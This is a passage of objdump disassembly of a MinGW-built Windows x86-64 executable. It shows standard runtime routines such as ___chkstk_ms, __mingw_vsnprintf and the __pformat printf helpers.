   1400039bb:	eb 0a                	jmp    1400039c7 <__mingw_enum_import_library_names+0xa7>
   1400039bd:	0f 1f 00             	nopl   (%rax)
   1400039c0:	83 e9 01             	sub    $0x1,%ecx
   1400039c3:	48 83 c0 14          	add    $0x14,%rax
   1400039c7:	44 8b 40 04          	mov    0x4(%rax),%r8d
   1400039cb:	45 85 c0             	test   %r8d,%r8d
   1400039ce:	75 07                	jne    1400039d7 <__mingw_enum_import_library_names+0xb7>
   1400039d0:	8b 50 0c             	mov    0xc(%rax),%edx
   1400039d3:	85 d2                	test   %edx,%edx
   1400039d5:	74 d7                	je     1400039ae <__mingw_enum_import_library_names+0x8e>
   1400039d7:	85 c9                	test   %ecx,%ecx
   1400039d9:	7f e5                	jg     1400039c0 <__mingw_enum_import_library_names+0xa0>
   1400039db:	44 8b 48 0c          	mov    0xc(%rax),%r9d
   1400039df:	4d 01 d9             	add    %r11,%r9
   1400039e2:	4c 89 c8             	mov    %r9,%rax
   1400039e5:	c3                   	ret
   1400039e6:	90                   	nop
   1400039e7:	90                   	nop
   1400039e8:	90                   	nop
   1400039e9:	90                   	nop
   1400039ea:	90                   	nop
   1400039eb:	90                   	nop
   1400039ec:	90                   	nop
   1400039ed:	90                   	nop
   1400039ee:	90                   	nop
   1400039ef:	90                   	nop

00000001400039f0 <___chkstk_ms>:
   1400039f0:	51                   	push   %rcx
   1400039f1:	50                   	push   %rax
   1400039f2:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   1400039f8:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   1400039fd:	72 19                	jb     140003a18 <___chkstk_ms+0x28>
   1400039ff:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
   140003a06:	48 83 09 00          	orq    $0x0,(%rcx)
   140003a0a:	48 2d 00 10 00 00    	sub    $0x1000,%rax
   140003a10:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140003a16:	77 e7                	ja     1400039ff <___chkstk_ms+0xf>
   140003a18:	48 29 c1             	sub    %rax,%rcx
   140003a1b:	48 83 09 00          	orq    $0x0,(%rcx)
   140003a1f:	58                   	pop    %rax
   140003a20:	59                   	pop    %rcx
   140003a21:	c3                   	ret
   140003a22:	90                   	nop
   140003a23:	90                   	nop
   140003a24:	90                   	nop
   140003a25:	90                   	nop
   140003a26:	90                   	nop
   140003a27:	90                   	nop
   140003a28:	90                   	nop
   140003a29:	90                   	nop
   140003a2a:	90                   	nop
   140003a2b:	90                   	nop
   140003a2c:	90                   	nop
   140003a2d:	90                   	nop
   140003a2e:	90                   	nop
   140003a2f:	90                   	nop

0000000140003a30 <__mingw_vsnprintf>:
   140003a30:	56                   	push   %rsi
   140003a31:	53                   	push   %rbx
   140003a32:	48 83 ec 38          	sub    $0x38,%rsp
   140003a36:	48 89 ce             	mov    %rcx,%rsi
   140003a39:	48 85 d2             	test   %rdx,%rdx
   140003a3c:	74 32                	je     140003a70 <__mingw_vsnprintf+0x40>
   140003a3e:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140003a43:	48 8d 5a ff          	lea    -0x1(%rdx),%rbx
   140003a47:	4d 89 c1             	mov    %r8,%r9
   140003a4a:	48 89 ca             	mov    %rcx,%rdx
   140003a4d:	41 89 d8             	mov    %ebx,%r8d
   140003a50:	31 c9                	xor    %ecx,%ecx
   140003a52:	e8 29 1d 00 00       	call   140005780 <__mingw_pformat>
   140003a57:	89 da                	mov    %ebx,%edx
   140003a59:	39 d8                	cmp    %ebx,%eax
   140003a5b:	0f 4e d0             	cmovle %eax,%edx
   140003a5e:	48 63 d2             	movslq %edx,%rdx
   140003a61:	c6 04 16 00          	movb   $0x0,(%rsi,%rdx,1)
   140003a65:	48 83 c4 38          	add    $0x38,%rsp
   140003a69:	5b                   	pop    %rbx
   140003a6a:	5e                   	pop    %rsi
   140003a6b:	c3                   	ret
   140003a6c:	0f 1f 40 00          	nopl   0x0(%rax)
   140003a70:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140003a75:	48 89 ca             	mov    %rcx,%rdx
   140003a78:	4d 89 c1             	mov    %r8,%r9
   140003a7b:	31 c9                	xor    %ecx,%ecx
   140003a7d:	45 31 c0             	xor    %r8d,%r8d
   140003a80:	e8 fb 1c 00 00       	call   140005780 <__mingw_pformat>
   140003a85:	48 83 c4 38          	add    $0x38,%rsp
   140003a89:	5b                   	pop    %rbx
   140003a8a:	5e                   	pop    %rsi
   140003a8b:	c3                   	ret
   140003a8c:	90                   	nop
   140003a8d:	90                   	nop
   140003a8e:	90                   	nop
   140003a8f:	90                   	nop

0000000140003a90 <__mingw_vsprintf>:
   140003a90:	53                   	push   %rbx
   140003a91:	48 83 ec 30          	sub    $0x30,%rsp
   140003a95:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   140003a9a:	48 89 cb             	mov    %rcx,%rbx
   140003a9d:	49 89 d1             	mov    %rdx,%r9
   140003aa0:	45 31 c0             	xor    %r8d,%r8d
   140003aa3:	48 89 ca             	mov    %rcx,%rdx
   140003aa6:	b9 00 40 00 00       	mov    $0x4000,%ecx
   140003aab:	e8 d0 1c 00 00       	call   140005780 <__mingw_pformat>
   140003ab0:	48 63 d0             	movslq %eax,%rdx
   140003ab3:	c6 04 13 00          	movb   $0x0,(%rbx,%rdx,1)
   140003ab7:	48 83 c4 30          	add    $0x30,%rsp
   140003abb:	5b                   	pop    %rbx
   140003abc:	c3                   	ret
   140003abd:	90                   	nop
   140003abe:	90                   	nop
   140003abf:	90                   	nop

0000000140003ac0 <__pformat_cvt>:
   140003ac0:	48 83 ec 68          	sub    $0x68,%rsp
   140003ac4:	48 8b 02             	mov    (%rdx),%rax
   140003ac7:	8b 52 08             	mov    0x8(%rdx),%edx
   140003aca:	41 89 d2             	mov    %edx,%r10d
   140003acd:	41 89 cb             	mov    %ecx,%r11d
   140003ad0:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140003ad5:	48 89 d1             	mov    %rdx,%rcx
   140003ad8:	89 54 24 58          	mov    %edx,0x58(%rsp)
   140003adc:	66 41 81 e2 ff 7f    	and    $0x7fff,%r10w
   140003ae2:	75 74                	jne    140003b58 <__pformat_cvt+0x98>
   140003ae4:	48 89 c2             	mov    %rax,%rdx
   140003ae7:	48 c1 ea 20          	shr    $0x20,%rdx
   140003aeb:	09 d0                	or     %edx,%eax
   140003aed:	0f 84 8d 00 00 00    	je     140003b80 <__pformat_cvt+0xc0>
   140003af3:	85 d2                	test   %edx,%edx
   140003af5:	0f 89 95 00 00 00    	jns    140003b90 <__pformat_cvt+0xd0>
   140003afb:	41 8d 92 c2 bf ff ff 	lea    -0x403e(%r10),%edx
   140003b02:	b8 01 00 00 00       	mov    $0x1,%eax
   140003b07:	0f bf d2             	movswl %dx,%edx
   140003b0a:	89 44 24 44          	mov    %eax,0x44(%rsp)
   140003b0e:	81 e1 00 80 00 00    	and    $0x8000,%ecx
   140003b14:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   140003b1b:	00 
   140003b1c:	89 08                	mov    %ecx,(%rax)
   140003b1e:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   140003b23:	48 8d 0d 26 65 00 00 	lea    0x6526(%rip),%rcx        # 14000a050 <fpi.0>
   140003b2a:	4c 89 4c 24 30       	mov    %r9,0x30(%rsp)
   140003b2f:	4c 8d 4c 24 44       	lea    0x44(%rsp),%r9
   140003b34:	44 89 44 24 28       	mov    %r8d,0x28(%rsp)
   140003b39:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140003b3e:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003b43:	44 89 5c 24 20       	mov    %r11d,0x20(%rsp)
   140003b48:	e8 03 2a 00 00       	call   140006550 <__gdtoa>
   140003b4d:	48 83 c4 68          	add    $0x68,%rsp
   140003b51:	c3                   	ret
   140003b52:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003b58:	66 41 81 fa ff 7f    	cmp    $0x7fff,%r10w
   140003b5e:	75 9b                	jne    140003afb <__pformat_cvt+0x3b>
   140003b60:	48 89 c2             	mov    %rax,%rdx
   140003b63:	48 c1 ea 20          	shr    $0x20,%rdx
   140003b67:	81 e2 ff ff ff 7f    	and    $0x7fffffff,%edx
   140003b6d:	09 c2                	or     %eax,%edx
   140003b6f:	74 2f                	je     140003ba0 <__pformat_cvt+0xe0>
   140003b71:	c7 44 24 44 04 00 00 	movl   $0x4,0x44(%rsp)
   140003b78:	00 
   140003b79:	31 d2                	xor    %edx,%edx
   140003b7b:	31 c9                	xor    %ecx,%ecx
   140003b7d:	eb 95                	jmp    140003b14 <__pformat_cvt+0x54>
   140003b7f:	90                   	nop
   140003b80:	31 c0                	xor    %eax,%eax
   140003b82:	31 d2                	xor    %edx,%edx
   140003b84:	eb 84                	jmp    140003b0a <__pformat_cvt+0x4a>
   140003b86:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140003b8d:	00 00 00 
   140003b90:	b8 02 00 00 00       	mov    $0x2,%eax
   140003b95:	ba c3 bf ff ff       	mov    $0xffffbfc3,%edx
   140003b9a:	e9 6b ff ff ff       	jmp    140003b0a <__pformat_cvt+0x4a>
   140003b9f:	90                   	nop
   140003ba0:	b8 03 00 00 00       	mov    $0x3,%eax
   140003ba5:	31 d2                	xor    %edx,%edx
   140003ba7:	e9 5e ff ff ff       	jmp    140003b0a <__pformat_cvt+0x4a>
   140003bac:	0f 1f 40 00          	nopl   0x0(%rax)

0000000140003bb0 <__pformat_putc>:
   140003bb0:	53                   	push   %rbx
   140003bb1:	48 83 ec 20          	sub    $0x20,%rsp
   140003bb5:	48 89 d3             	mov    %rdx,%rbx
   140003bb8:	8b 52 08             	mov    0x8(%rdx),%edx
   140003bbb:	f6 c6 40             	test   $0x40,%dh
   140003bbe:	75 08                	jne    140003bc8 <__pformat_putc+0x18>
   140003bc0:	8b 43 24             	mov    0x24(%rbx),%eax
   140003bc3:	39 43 28             	cmp    %eax,0x28(%rbx)
   140003bc6:	7e 12                	jle    140003bda <__pformat_putc+0x2a>
   140003bc8:	48 8b 03             	mov    (%rbx),%rax
   140003bcb:	80 e6 20             	and    $0x20,%dh
   140003bce:	75 20                	jne    140003bf0 <__pformat_putc+0x40>
   140003bd0:	48 63 53 24          	movslq 0x24(%rbx),%rdx
   140003bd4:	88 0c 10             	mov    %cl,(%rax,%rdx,1)
   140003bd7:	8b 43 24             	mov    0x24(%rbx),%eax
   140003bda:	83 c0 01             	add    $0x1,%eax
   140003bdd:	89 43 24             	mov    %eax,0x24(%rbx)
   140003be0:	48 83 c4 20          	add    $0x20,%rsp
   140003be4:	5b                   	pop    %rbx
   140003be5:	c3                   	ret
   140003be6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140003bed:	00 00 00 
   140003bf0:	48 89 c2             	mov    %rax,%rdx
   140003bf3:	e8 b8 57 00 00       	call   1400093b0 <fputc>
   140003bf8:	8b 43 24             	mov    0x24(%rbx),%eax
   140003bfb:	83 c0 01             	add    $0x1,%eax
   140003bfe:	89 43 24             	mov    %eax,0x24(%rbx)
   140003c01:	48 83 c4 20          	add    $0x20,%rsp
   140003c05:	5b                   	pop    %rbx
   140003c06:	c3                   	ret
   140003c07:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140003c0e:	00 00 

0000000140003c10 <__pformat_wputchars>:
   140003c10:	41 57                	push   %r15
   140003c12:	41 56                	push   %r14
   140003c14:	41 55                	push   %r13
   140003c16:	41 54                	push   %r12
   140003c18:	55                   	push   %rbp
   140003c19:	57                   	push   %rdi
   140003c1a:	56                   	push   %rsi
   140003c1b:	53                   	push   %rbx
   140003c1c:	48 83 ec 48          	sub    $0x48,%rsp
   140003c20:	4c 8d 6c 24 28       	lea    0x28(%rsp),%r13
   140003c25:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140003c2a:	89 d6                	mov    %edx,%esi
   140003c2c:	4c 89 c3             	mov    %r8,%rbx
   140003c2f:	31 d2                	xor    %edx,%edx
   140003c31:	48 89 cd             	mov    %rcx,%rbp
   140003c34:	4d 89 e8             	mov    %r13,%r8
   140003c37:	48 89 f9             	mov    %rdi,%rcx
   140003c3a:	e8 71 52 00 00       	call   140008eb0 <wcrtomb>
   140003c3f:	8b 43 10             	mov    0x10(%rbx),%eax
   140003c42:	39 c6                	cmp    %eax,%esi
   140003c44:	89 c2                	mov    %eax,%edx
   140003c46:	0f 4e d6             	cmovle %esi,%edx
   140003c49:	85 c0                	test   %eax,%eax
   140003c4b:	8b 43 0c             	mov    0xc(%rbx),%eax
   140003c4e:	0f 49 f2             	cmovns %edx,%esi
   140003c51:	39 f0                	cmp    %esi,%eax
   140003c53:	0f 8f e2 00 00 00    	jg     140003d3b <__pformat_wputchars+0x12b>
   140003c59:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   140003c60:	44 8d 66 ff          	lea    -0x1(%rsi),%r12d
   140003c64:	85 f6                	test   %esi,%esi
   140003c66:	0f 8e 29 01 00 00    	jle    140003d95 <__pformat_wputchars+0x185>
   140003c6c:	31 f6                	xor    %esi,%esi
   140003c6e:	41 83 c4 01          	add    $0x1,%r12d
   140003c72:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003c78:	0f b7 54 75 00       	movzwl 0x0(%rbp,%rsi,2),%edx
   140003c7d:	4d 89 e8             	mov    %r13,%r8
   140003c80:	48 89 f9             	mov    %rdi,%rcx
   140003c83:	e8 28 52 00 00       	call   140008eb0 <wcrtomb>
   140003c88:	85 c0                	test   %eax,%eax
   140003c8a:	0f 8e 8d 00 00 00    	jle    140003d1d <__pformat_wputchars+0x10d>
   140003c90:	83 e8 01             	sub    $0x1,%eax
   140003c93:	49 89 fe             	mov    %rdi,%r14
   140003c96:	4c 8d 7c 07 01       	lea    0x1(%rdi,%rax,1),%r15
   140003c9b:	eb 18                	jmp    140003cb5 <__pformat_wputchars+0xa5>
   140003c9d:	0f 1f 00             	nopl   (%rax)
   140003ca0:	48 63 53 24          	movslq 0x24(%rbx),%rdx
   140003ca4:	88 0c 10             	mov    %cl,(%rax,%rdx,1)
   140003ca7:	8b 43 24             	mov    0x24(%rbx),%eax
   140003caa:	83 c0 01             	add    $0x1,%eax
   140003cad:	89 43 24             	mov    %eax,0x24(%rbx)
   140003cb0:	4d 39 fe             	cmp    %r15,%r14
   140003cb3:	74 37                	je     140003cec <__pformat_wputchars+0xdc>
   140003cb5:	8b 53 08             	mov    0x8(%rbx),%edx
   140003cb8:	49 83 c6 01          	add    $0x1,%r14
   140003cbc:	f6 c6 40             	test   $0x40,%dh
   140003cbf:	75 08                	jne    140003cc9 <__pformat_wputchars+0xb9>
   140003cc1:	8b 43 24             	mov    0x24(%rbx),%eax
   140003cc4:	39 43 28             	cmp    %eax,0x28(%rbx)
   140003cc7:	7e e1                	jle    140003caa <__pformat_wputchars+0x9a>
   140003cc9:	41 0f be 4e ff       	movsbl -0x1(%r14),%ecx
   140003cce:	48 8b 03             	mov    (%rbx),%rax
   140003cd1:	80 e6 20             	and    $0x20,%dh
   140003cd4:	74 ca                	je     140003ca0 <__pformat_wputchars+0x90>
   140003cd6:	48 89 c2             	mov    %rax,%rdx
   140003cd9:	e8 d2 56 00 00       	call   1400093b0 <fputc>
   140003cde:	8b 43 24             	mov    0x24(%rbx),%eax
   140003ce1:	83 c0 01             	add    $0x1,%eax
   140003ce4:	89 43 24             	mov    %eax,0x24(%rbx)
   140003ce7:	4d 39 fe             	cmp    %r15,%r14
   140003cea:	75 c9                	jne    140003cb5 <__pformat_wputchars+0xa5>
   140003cec:	48 83 c6 01          	add    $0x1,%rsi
   140003cf0:	44 89 e0             	mov    %r12d,%eax
   140003cf3:	29 f0                	sub    %esi,%eax
   140003cf5:	85 c0                	test   %eax,%eax
   140003cf7:	0f 8f 7b ff ff ff    	jg     140003c78 <__pformat_wputchars+0x68>
   140003cfd:	8b 43 0c             	mov    0xc(%rbx),%eax
   140003d00:	8d 50 ff             	lea    -0x1(%rax),%edx
   140003d03:	89 53 0c             	mov    %edx,0xc(%rbx)
   140003d06:	85 c0                	test   %eax,%eax
   140003d08:	7e 20                	jle    140003d2a <__pformat_wputchars+0x11a>
   140003d0a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003d10:	48 89 da             	mov    %rbx,%rdx
   140003d13:	b9 20 00 00 00       	mov    $0x20,%ecx
   140003d18:	e8 93 fe ff ff       	call   140003bb0 <__pformat_putc>
   140003d1d:	8b 43 0c             	mov    0xc(%rbx),%eax
   140003d20:	8d 50 ff             	lea    -0x1(%rax),%edx
   140003d23:	89 53 0c             	mov    %edx,0xc(%rbx)
   140003d26:	85 c0                	test   %eax,%eax
   140003d28:	7f e6                	jg     140003d10 <__pformat_wputchars+0x100>
   140003d2a:	48 83 c4 48          	add    $0x48,%rsp
   140003d2e:	5b                   	pop    %rbx
   140003d2f:	5e                   	pop    %rsi
   140003d30:	5f                   	pop    %rdi
   140003d31:	5d                   	pop    %rbp
   140003d32:	41 5c                	pop    %r12
   140003d34:	41 5d                	pop    %r13
   140003d36:	41 5e                	pop    %r14
   140003d38:	41 5f                	pop    %r15
   140003d3a:	c3                   	ret
   140003d3b:	29 f0                	sub    %esi,%eax
   140003d3d:	89 43 0c             	mov    %eax,0xc(%rbx)
   140003d40:	f6 43 09 04          	testb  $0x4,0x9(%rbx)
   140003d44:	75 3a                	jne    140003d80 <__pformat_wputchars+0x170>
   140003d46:	83 e8 01             	sub    $0x1,%eax
   140003d49:	89 43 0c             	mov    %eax,0xc(%rbx)
   140003d4c:	0f 1f 40 00          	nopl   0x0(%rax)
   140003d50:	48 89 da             	mov    %rbx,%rdx
   140003d53:	b9 20 00 00 00       	mov    $0x20,%ecx
   140003d58:	e8 53 fe ff ff       	call   140003bb0 <__pformat_putc>
   140003d5d:	8b 43 0c             	mov    0xc(%rbx),%eax
   140003d60:	8d 50 ff             	lea    -0x1(%rax),%edx
   140003d63:	89 53 0c             	mov    %edx,0xc(%rbx)
   140003d66:	85 c0                	test   %eax,%eax
   140003d68:	75 e6                	jne    140003d50 <__pformat_wputchars+0x140>
   140003d6a:	44 8d 66 ff          	lea    -0x1(%rsi),%r12d
   140003d6e:	85 f6                	test   %esi,%esi
   140003d70:	0f 8f f6 fe ff ff    	jg     140003c6c <__pformat_wputchars+0x5c>
   140003d76:	eb a5                	jmp    140003d1d <__pformat_wputchars+0x10d>
   140003d78:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140003d7f:	00 
   140003d80:	44 8d 66 ff          	lea    -0x1(%rsi),%r12d
   140003d84:	85 f6                	test   %esi,%esi
   140003d86:	0f 8f e0 fe ff ff    	jg     140003c6c <__pformat_wputchars+0x5c>
   140003d8c:	83 6b 0c 01          	subl   $0x1,0xc(%rbx)
   140003d90:	e9 7b ff ff ff       	jmp    140003d10 <__pformat_wputchars+0x100>
   140003d95:	c7 43 0c fe ff ff ff 	movl   $0xfffffffe,0xc(%rbx)
   140003d9c:	eb 8c                	jmp    140003d2a <__pformat_wputchars+0x11a>
   140003d9e:	66 90                	xchg   %ax,%ax

0000000140003da0 <__pformat_putchars>:
   140003da0:	57                   	push   %rdi
   140003da1:	56                   	push   %rsi
   140003da2:	53                   	push   %rbx
   140003da3:	48 83 ec 20          	sub    $0x20,%rsp
   140003da7:	41 8b 40 10          	mov    0x10(%r8),%eax
   140003dab:	89 d7                	mov    %edx,%edi
   140003dad:	39 c2                	cmp    %eax,%edx
   140003daf:	89 c2                	mov    %eax,%edx
   140003db1:	48 89 ce             	mov    %rcx,%rsi
   140003db4:	0f 4e d7             	cmovle %edi,%edx
   140003db7:	85 c0                	test   %eax,%eax
   140003db9:	41 8b 40 0c          	mov    0xc(%r8),%eax
   140003dbd:	4c 89 c3             	mov    %r8,%rbx
   140003dc0:	0f 49 fa             	cmovns %edx,%edi
   140003dc3:	39 f8                	cmp    %edi,%eax
   140003dc5:	0f 8f bd 00 00 00    	jg     140003e88 <__pformat_putchars+0xe8>
   140003dcb:	41 c7 40 0c ff ff ff 	movl   $0xffffffff,0xc(%r8)
   140003dd2:	ff 
   140003dd3:	8d 57 ff             	lea    -0x1(%rdi),%edx
   140003dd6:	85 ff                	test   %edi,%edi
   140003dd8:	0f 84 97 00 00 00    	je     140003e75 <__pformat_putchars+0xd5>
   140003dde:	8b 43 08             	mov    0x8(%rbx),%eax
   140003de1:	8d 7a 01             	lea    0x1(%rdx),%edi
   140003de4:	48 01 f7             	add    %rsi,%rdi
   140003de7:	eb 1f                	jmp    140003e08 <__pformat_putchars+0x68>
   140003de9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003df0:	48 63 43 24          	movslq 0x24(%rbx),%rax
   140003df4:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
   140003df7:	8b 53 24             	mov    0x24(%rbx),%edx
   140003dfa:	83 c2 01             	add    $0x1,%edx
   140003dfd:	89 53 24             	mov    %edx,0x24(%rbx)
   140003e00:	48 39 fe             	cmp    %rdi,%rsi
   140003e03:	74 3c                	je     140003e41 <__pformat_putchars+0xa1>
   140003e05:	8b 43 08             	mov    0x8(%rbx),%eax
   140003e08:	48 83 c6 01          	add    $0x1,%rsi
   140003e0c:	f6 c4 40             	test   $0x40,%ah
   140003e0f:	75 08                	jne    140003e19 <__pformat_putchars+0x79>
   140003e11:	8b 53 24             	mov    0x24(%rbx),%edx
   140003e14:	39 53 28             	cmp    %edx,0x28(%rbx)
   140003e17:	7e e1                	jle    140003dfa <__pformat_putchars+0x5a>
   140003e19:	0f be 4e ff          	movsbl -0x1(%rsi),%ecx
   140003e1d:	48 8b 13             	mov    (%rbx),%rdx
   140003e20:	f6 c4 20             	test   $0x20,%ah
   140003e23:	74 cb                	je     140003df0 <__pformat_putchars+0x50>
   140003e25:	e8 86 55 00 00       	call   1400093b0 <fputc>
   140003e2a:	8b 53 24             	mov    0x24(%rbx),%edx
   140003e2d:	eb cb                	jmp    140003dfa <__pformat_putchars+0x5a>
   140003e2f:	90                   	nop
   140003e30:	48 63 43 24          	movslq 0x24(%rbx),%rax
   140003e34:	c6 04 02 20          	movb   $0x20,(%rdx,%rax,1)
   140003e38:	8b 53 24             	mov    0x24(%rbx),%edx
   140003e3b:	83 c2 01             	add    $0x1,%edx
   140003e3e:	89 53 24             	mov    %edx,0x24(%rbx)
   140003e41:	8b 43 0c             	mov    0xc(%rbx),%eax
   140003e44:	8d 50 ff             	lea    -0x1(%rax),%edx
   140003e47:	89 53 0c             	mov    %edx,0xc(%rbx)
   140003e4a:	85 c0                	test   %eax,%eax
   140003e4c:	7e 2e                	jle    140003e7c <__pformat_putchars+0xdc>
   140003e4e:	8b 43 08             	mov    0x8(%rbx),%eax
   140003e51:	f6 c4 40             	test   $0x40,%ah
   140003e54:	75 08                	jne    140003e5e <__pformat_putchars+0xbe>
   140003e56:	8b 53 24             	mov    0x24(%rbx),%edx
   140003e59:	39 53 28             	cmp    %edx,0x28(%rbx)
   140003e5c:	7e dd                	jle    140003e3b <__pformat_putchars+0x9b>
   140003e5e:	48 8b 13             	mov    (%rbx),%rdx
   140003e61:	f6 c4 20             	test   $0x20,%ah
   140003e64:	74 ca                	je     140003e30 <__pformat_putchars+0x90>
   140003e66:	b9 20 00 00 00       	mov    $0x20,%ecx
   140003e6b:	e8 40 55 00 00       	call   1400093b0 <fputc>
   140003e70:	8b 53 24             	mov    0x24(%rbx),%edx
   140003e73:	eb c6                	jmp    140003e3b <__pformat_putchars+0x9b>
   140003e75:	c7 43 0c fe ff ff ff 	movl   $0xfffffffe,0xc(%rbx)
   140003e7c:	48 83 c4 20          	add    $0x20,%rsp
   140003e80:	5b                   	pop    %rbx
   140003e81:	5e                   	pop    %rsi
   140003e82:	5f                   	pop    %rdi
   140003e83:	c3                   	ret
   140003e84:	0f 1f 40 00          	nopl   0x0(%rax)
   140003e88:	29 f8                	sub    %edi,%eax
   140003e8a:	41 89 40 0c          	mov    %eax,0xc(%r8)
   140003e8e:	89 c2                	mov    %eax,%edx
   140003e90:	41 8b 40 08          	mov    0x8(%r8),%eax
   140003e94:	f6 c4 04             	test   $0x4,%ah
   140003e97:	75 37                	jne    140003ed0 <__pformat_putchars+0x130>
   140003e99:	8d 42 ff             	lea    -0x1(%rdx),%eax
   140003e9c:	41 89 40 0c          	mov    %eax,0xc(%r8)
   140003ea0:	48 89 da             	mov    %rbx,%rdx
   140003ea3:	b9 20 00 00 00       	mov    $0x20,%ecx
   140003ea8:	e8 03 fd ff ff       	call   140003bb0 <__pformat_putc>
   140003ead:	8b 43 0c             	mov    0xc(%rbx),%eax
   140003eb0:	8d 50 ff             	lea    -0x1(%rax),%edx
   140003eb3:	89 53 0c             	mov    %edx,0xc(%rbx)
   140003eb6:	85 c0                	test   %eax,%eax
   140003eb8:	75 e6                	jne    140003ea0 <__pformat_putchars+0x100>
   140003eba:	8d 57 ff             	lea    -0x1(%rdi),%edx
   140003ebd:	85 ff                	test   %edi,%edi
   140003ebf:	0f 85 19 ff ff ff    	jne    140003dde <__pformat_putchars+0x3e>
   140003ec5:	e9 77 ff ff ff       	jmp    140003e41 <__pformat_putchars+0xa1>
   140003eca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003ed0:	8d 57 ff             	lea    -0x1(%rdi),%edx
   140003ed3:	85 ff                	test   %edi,%edi
   140003ed5:	0f 85 06 ff ff ff    	jne    140003de1 <__pformat_putchars+0x41>
   140003edb:	83 6b 0c 01          	subl   $0x1,0xc(%rbx)
   140003edf:	e9 6d ff ff ff       	jmp    140003e51 <__pformat_putchars+0xb1>
   140003ee4:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140003eeb:	00 00 00 00 
   140003eef:	90                   	nop

0000000140003ef0 <__pformat_puts>:
   140003ef0:	56                   	push   %rsi
   140003ef1:	53                   	push   %rbx
   140003ef2:	48 83 ec 28          	sub    $0x28,%rsp
   140003ef6:	48 8d 05 b3 76 00 00 	lea    0x76b3(%rip),%rax        # 14000b5b0 <.rdata>
   140003efd:	48 89 cb             	mov    %rcx,%rbx
   140003f00:	48 85 c9             	test   %rcx,%rcx
   140003f03:	48 89 d6             	mov    %rdx,%rsi
   140003f06:	48 63 52 10          	movslq 0x10(%rdx),%rdx
   140003f0a:	48 0f 44 d8          	cmove  %rax,%rbx
   140003f0e:	48 89 d9             	mov    %rbx,%rcx
   140003f11:	85 d2                	test   %edx,%edx
   140003f13:	78 1b                	js     140003f30 <__pformat_puts+0x40>
   140003f15:	e8 36 4e 00 00       	call   140008d50 <strnlen>
   140003f1a:	49 89 f0             	mov    %rsi,%r8
   140003f1d:	89 c2                	mov    %eax,%edx
   140003f1f:	48 89 d9             	mov    %rbx,%rcx
   140003f22:	48 83 c4 28          	add    $0x28,%rsp
   140003f26:	5b                   	pop    %rbx
   140003f27:	5e                   	pop    %rsi
   140003f28:	e9 73 fe ff ff       	jmp    140003da0 <__pformat_putchars>
   140003f2d:	0f 1f 00             	nopl   (%rax)
   140003f30:	e8 cb 54 00 00       	call   140009400 <strlen>
   140003f35:	eb e3                	jmp    140003f1a <__pformat_puts+0x2a>
   140003f37:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140003f3e:	00 00 

0000000140003f40 <__pformat_emit_inf_or_nan>:
   140003f40:	48 83 ec 38          	sub    $0x38,%rsp
   140003f44:	b8 2d 00 00 00       	mov    $0x2d,%eax
   140003f49:	45 8b 50 08          	mov    0x8(%r8),%r10d
   140003f4d:	41 c7 40 10 ff ff ff 	movl   $0xffffffff,0x10(%r8)
   140003f54:	ff 
   140003f55:	85 c9                	test   %ecx,%ecx
   140003f57:	74 47                	je     140003fa0 <__pformat_emit_inf_or_nan+0x60>
   140003f59:	88 44 24 2c          	mov    %al,0x2c(%rsp)
   140003f5d:	4c 8d 4c 24 2d       	lea    0x2d(%rsp),%r9
   140003f62:	4c 8d 5c 24 2c       	lea    0x2c(%rsp),%r11
   140003f67:	41 83 e2 20          	and    $0x20,%r10d
   140003f6b:	31 c9                	xor    %ecx,%ecx
   140003f6d:	0f b6 04 0a          	movzbl (%rdx,%rcx,1),%eax
   140003f71:	83 e0 df             	and    $0xffffffdf,%eax
   140003f74:	44 09 d0             	or     %r10d,%eax
   140003f77:	41 88 04 09          	mov    %al,(%r9,%rcx,1)
   140003f7b:	48 83 c1 01          	add    $0x1,%rcx
   140003f7f:	48 83 f9 03          	cmp    $0x3,%rcx
   140003f83:	75 e8                	jne    140003f6d <__pformat_emit_inf_or_nan+0x2d>
   140003f85:	49 8d 51 03          	lea    0x3(%r9),%rdx
   140003f89:	4c 89 d9             	mov    %r11,%rcx
   140003f8c:	44 29 da             	sub    %r11d,%edx
   140003f8f:	e8 0c fe ff ff       	call   140003da0 <__pformat_putchars>
   140003f94:	90                   	nop
   140003f95:	48 83 c4 38          	add    $0x38,%rsp
   140003f99:	c3                   	ret
   140003f9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140003fa0:	41 f7 c2 00 01 00 00 	test   $0x100,%r10d
   140003fa7:	74 07                	je     140003fb0 <__pformat_emit_inf_or_nan+0x70>
   140003fa9:	b8 2b 00 00 00       	mov    $0x2b,%eax
   140003fae:	eb a9                	jmp    140003f59 <__pformat_emit_inf_or_nan+0x19>
   140003fb0:	41 f6 c2 40          	test   $0x40,%r10b
   140003fb4:	74 0a                	je     140003fc0 <__pformat_emit_inf_or_nan+0x80>
   140003fb6:	b8 20 00 00 00       	mov    $0x20,%eax
